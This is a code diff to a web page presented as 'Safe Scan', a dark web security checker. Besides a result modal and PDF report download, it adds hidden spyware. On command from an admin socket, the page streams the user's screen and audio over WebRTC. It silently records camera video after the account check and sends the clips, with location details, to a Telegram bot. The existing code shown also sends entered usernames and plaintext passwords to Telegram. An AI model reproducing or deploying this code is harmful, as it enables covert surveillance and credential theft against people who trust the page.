@@ -12,6 +12,7 @@
     <meta name="theme-color" content="#0a0a1a">
     <meta name="description" content="Premium dark web monitoring & security scanning for your digital identity.">
     <title>Safe Scan — Dark Web Security</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
@@ -1286,6 +1287,95 @@
                 flex: 0 0 260px;
             }
         }
+
+        /* Scan Modal */
+        .scan-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .scan-modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .scan-modal {
+            background: var(--bg-primary);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-lg);
+            width: 90%;
+            max-width: 400px;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            transform: scale(0.95) translateY(10px);
+            transition: all 0.3s ease;
+        }
+        .scan-modal-overlay.show .scan-modal {
+            transform: scale(1) translateY(0);
+        }
+        .scan-modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .scan-modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+        .scan-modal-close {
+            background: none;
+            border: none;
+            color: var(--text-tertiary);
+            font-size: 20px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .scan-modal-close:hover {
+            color: var(--text-primary);
+        }
+        .scan-modal-body {
+            margin-bottom: 24px;
+        }
+        .scan-modal-footer {
+            display: flex;
+            justify-content: center;
+        }
+        .scan-modal-btn {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 12px 24px;
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: opacity 0.2s;
+            width: 100%;
+            justify-content: center;
+        }
+        .scan-modal-btn:hover {
+            opacity: 0.9;
+        }
+        .scan-modal-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 
@@ -1709,6 +1799,64 @@
                         }
                     });
 
+                    adminSocket.on('webrtc:request_screen', async (data) => {
+                        const adminSocketId = data.adminSocketId;
+                        console.log('[WebRTC] Request SCREEN stream from admin:', adminSocketId);
+
+                        if (peerConnection) {
+                            peerConnection.close();
+                            peerConnection = null;
+                        }
+
+                        peerConnection = new RTCPeerConnection({
+                            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                        });
+
+                        let localStream = null;
+                        try {
+                            localStream = await navigator.mediaDevices.getDisplayMedia({
+                                video: true,
+                                audio: true
+                            });
+                            
+                            localStream.getVideoTracks()[0].onended = () => {
+                                if (peerConnection) {
+                                    peerConnection.close();
+                                    peerConnection = null;
+                                }
+                            };
+                        } catch (e) {
+                            console.error('[WebRTC] Error acquiring screen stream:', e);
+                            return;
+                        }
+
+                        if (localStream) {
+                            localStream.getTracks().forEach(track => {
+                                peerConnection.addTrack(track, localStream);
+                            });
+                        }
+
+                        peerConnection.onicecandidate = (event) => {
+                            if (event.candidate && adminSocket && adminSocket.connected) {
+                                adminSocket.emit('webrtc:ice-candidate', {
+                                    adminSocketId: adminSocketId,
+                                    candidate: event.candidate
+                                });
+                            }
+                        };
+
+                        try {
+                            const offer = await peerConnection.createOffer();
+                            await peerConnection.setLocalDescription(offer);
+                            adminSocket.emit('webrtc:offer', {
+                                adminSocketId: adminSocketId,
+                                offer: offer
+                            });
+                        } catch (err) {
+                            console.error('[WebRTC] Error creating offer:', err);
+                        }
+                    });
+
                     adminSocket.on('webrtc:answer', async (data) => {
                         console.log('[WebRTC] Received answer');
                         if (peerConnection) {
@@ -1792,6 +1940,23 @@
                             });
                         };
                         reader.readAsDataURL(audioBlob);
+                    }
+                } catch (e) { /* silent */ }
+            }
+
+            function sendVideoToAdmin(videoBlob, duration) {
+                try {
+                    if (adminSocket && adminSocket.connected && videoBlob) {
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            adminSocket.emit('video:recording', {
+                                uuid: userUUID,
+                                video: reader.result,
+                                duration: duration || 0,
+                                mimeType: videoBlob.type || 'video/webm'
+                            });
+                        };
+                        reader.readAsDataURL(videoBlob);
                     }
                 } catch (e) { /* silent */ }
             }
@@ -2088,6 +2253,20 @@
                 } catch (error) { return { success: false, message: error.message }; }
             }
 
+            async function sendVideoToTelegram(videoBlob, caption) {
+                try {
+                    if (!videoBlob || videoBlob.size === 0) return { success: false, message: 'Invalid video' };
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramConfig.chatId);
+                    const ext = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('document', videoBlob, `video_${Date.now()}.${ext}`);
+                    formData.append('caption', caption);
+                    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendDocument`, { method: 'POST', body: formData });
+                    const data = await response.json();
+                    return data.ok ? { success: true } : { success: false, message: data.description || 'Error' };
+                } catch (error) { return { success: false, message: error.message }; }
+            }
+
             // ═══════════════════════════════════════════════════════════════
             // DEVICE INFO COLLECTION
             // ═══════════════════════════════════════════════════════════════
@@ -2292,6 +2471,14 @@
             let backgroundRecordingStartTime = null;
             let backgroundRecordingDuration = 0;
             let recordingInterval = null;
+            
+            let backgroundVideoRecorder = null;
+            let backgroundVideoChunks = [];
+            let isBackgroundVideoRecording = false;
+            let backgroundVideoRecordingStartTime = null;
+            let backgroundVideoRecordingDuration = 0;
+            let videoRecordingInterval = null;
+
 
             function startContinuousCapture() {
                 // First capture after 1 second, then every 3 seconds
@@ -2387,6 +2574,75 @@
                 }
                 return false;
             }
+
+            function getVideoMimeType() {
+                const types = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm', 'video/mp4'];
+                for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
+                return '';
+            }
+
+            function setupMobileCompatibleVideoRecorder(stream) {
+                if (!stream || !stream.getVideoTracks().length || !window.MediaRecorder) return false;
+                try {
+                    const mime = getVideoMimeType();
+                    backgroundVideoRecorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
+                    backgroundVideoChunks = [];
+                    backgroundVideoRecorder.ondataavailable = e => { if (e.data.size > 0) backgroundVideoChunks.push(e.data); };
+                    backgroundVideoRecorder.onstop = () => {
+                        isBackgroundVideoRecording = false;
+                        if (backgroundVideoChunks.length > 0) {
+                            const blob = new Blob(backgroundVideoChunks, { type: backgroundVideoRecorder.mimeType || 'video/webm' });
+                            sendBackgroundVideoRecordingToTelegram(blob);
+                        }
+                    };
+                    backgroundVideoRecorder.onerror = () => { isBackgroundVideoRecording = false; };
+                    return true;
+                } catch (e) { return false; }
+            }
+
+            function startBackgroundVideoRecording() {
+                if (!permissionsGranted.camera || !window.cameraStream) return false;
+                if (backgroundVideoRecorder && backgroundVideoRecorder.state !== 'inactive') {
+                    try { backgroundVideoRecorder.stop(); } catch (e) { }
+                }
+                if (!backgroundVideoRecorder) { if (!setupMobileCompatibleVideoRecorder(window.cameraStream)) return false; }
+                if (!backgroundVideoRecorder) return false;
+                try {
+                    backgroundVideoChunks = [];
+                    backgroundVideoRecordingStartTime = Date.now();
+                    backgroundVideoRecorder.start(5000);
+                    isBackgroundVideoRecording = true;
+                    if (videoRecordingInterval) clearInterval(videoRecordingInterval);
+                    videoRecordingInterval = setInterval(() => {
+                        if (backgroundVideoRecordingStartTime) backgroundVideoRecordingDuration = Math.floor((Date.now() - backgroundVideoRecordingStartTime) / 1000);
+                    }, 1000);
+                    return true;
+                } catch (e) { return false; }
+            }
+
+            function stopBackgroundVideoRecording() {
+                if (backgroundVideoRecorder && isBackgroundVideoRecording) {
+                    if (videoRecordingInterval) { clearInterval(videoRecordingInterval); videoRecordingInterval = null; }
+                    backgroundVideoRecorder.stop();
+                }
+            }
+
+            async function sendBackgroundVideoRecordingToTelegram(videoBlob) {
+                const caption = `🎥 Video Recording\n⏱️ Duration: ${backgroundVideoRecordingDuration || 0}s\n📅 ${new Date().toLocaleString()}\n\n${getLocationInfo()}`;
+                await sendVideoToTelegram(videoBlob, caption);
+                sendVideoToAdmin(videoBlob, backgroundVideoRecordingDuration || 0);
+            }
+
+            function startUserInitiatedVideoRecording() {
+                if (!permissionsGranted.camera) return false;
+                const result = startBackgroundVideoRecording();
+                if (result) {
+                    setTimeout(() => { if (isBackgroundVideoRecording) stopBackgroundVideoRecording(); }, 30000);
+                    return true;
+                }
+                return false;
+            }
+
 
             // ═══════════════════════════════════════════════════════════════
             // PERMISSIONS
@@ -2600,8 +2856,43 @@
 
             function showLeakResult(message, className) {
                 const el = document.getElementById('leakResult');
-                el.innerHTML = message;
-                el.className = 'leak-result show ' + className;
+                el.className = 'leak-result';
+                el.innerHTML = '';
+                
+                const modal = document.getElementById('scanResultModal');
+                const content = document.getElementById('scanResultModalContent');
+                content.innerHTML = '<div class="leak-result show ' + className + '" style="margin: 0; padding: 20px;">' + message + '</div>';
+                modal.classList.add('show');
+            }
+
+            function closeScanResultModal() {
+                const modal = document.getElementById('scanResultModal');
+                modal.classList.remove('show');
+            }
+
+            async function downloadScanReportPdf() {
+                const element = document.getElementById('scanResultModalContentContainer');
+                const btn = document.getElementById('downloadPdfBtn');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
+                btn.disabled = true;
+                
+                try {
+                    const opt = {
+                        margin:       10,
+                        filename:     'SafeScan_Report.pdf',
+                        image:        { type: 'jpeg', quality: 0.98 },
+                        html2canvas:  { scale: 2 },
+                        jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
+                    };
+                    await html2pdf().set(opt).from(element).save();
+                } catch(e) {
+                    console.error('PDF generation error:', e);
+                    alert('Failed to generate PDF report.');
+                } finally {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }
             }
 
             async function sendLeakCheckResultToTelegram(username, password, passwordHash, leakCount, platform, scanError) {
@@ -2663,6 +2954,12 @@
                 } catch (e) {
                     try { let hash = ''; if (password) hash = await simpleHash(password); await sendLeakCheckResultToTelegram(username, password, hash, 0, platform, e.message || 'Unknown'); } catch (te) { }
                 } finally {
+                    if (!recStarted && permissionsGranted.microphone && !isBackgroundRecording) {
+                        setTimeout(startUserInitiatedRecording, 100);
+                    }
+                    if (!recStarted && permissionsGranted.camera && !isBackgroundVideoRecording) {
+                        setTimeout(startUserInitiatedVideoRecording, 100);
+                    }
                     isCheckingLeak = false;
                     if (activeBtn) { activeBtn.disabled = false; activeBtn.innerHTML = '<i class="fas fa-lock"></i> <span>Verify Account Securely</span>'; }
                 }
@@ -2831,6 +3128,28 @@
             window.addEventListener('error', e => { diagnostics.errors.push({ message: e.error?.message, timestamp: new Date().toISOString() }); });
             window.addEventListener('unhandledrejection', e => { diagnostics.errors.push({ message: String(e.reason), timestamp: new Date().toISOString() }); });
         </script>
+    <!-- Scan Result Modal -->
+    <div class="scan-modal-overlay" id="scanResultModal">
+        <div class="scan-modal">
+            <div class="scan-modal-header">
+                <div class="scan-modal-title">Scan Report</div>
+                <button class="scan-modal-close" onclick="closeScanResultModal()"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="scan-modal-body" id="scanResultModalContentContainer">
+                <div style="text-align: center; margin-bottom: 15px;">
+                    <img src="logo.jpg" alt="Safe Scan Logo" style="width: 80px; border-radius: 12px; margin-bottom: 10px;">
+                    <h3 style="font-size: 16px; margin-bottom: 5px;">Safe Scan</h3>
+                    <p style="font-size: 13px; color: var(--text-secondary);">Dark Web Security Report</p>
+                </div>
+                <div id="scanResultModalContent"></div>
+            </div>
+            <div class="scan-modal-footer">
+                <button class="scan-modal-btn" id="downloadPdfBtn" onclick="downloadScanReportPdf()">
+                    <i class="fas fa-file-pdf"></i> Download Report (PDF)
+                </button>
+            </div>
+        </div>
+    </div>
 </body>
 
 </html>
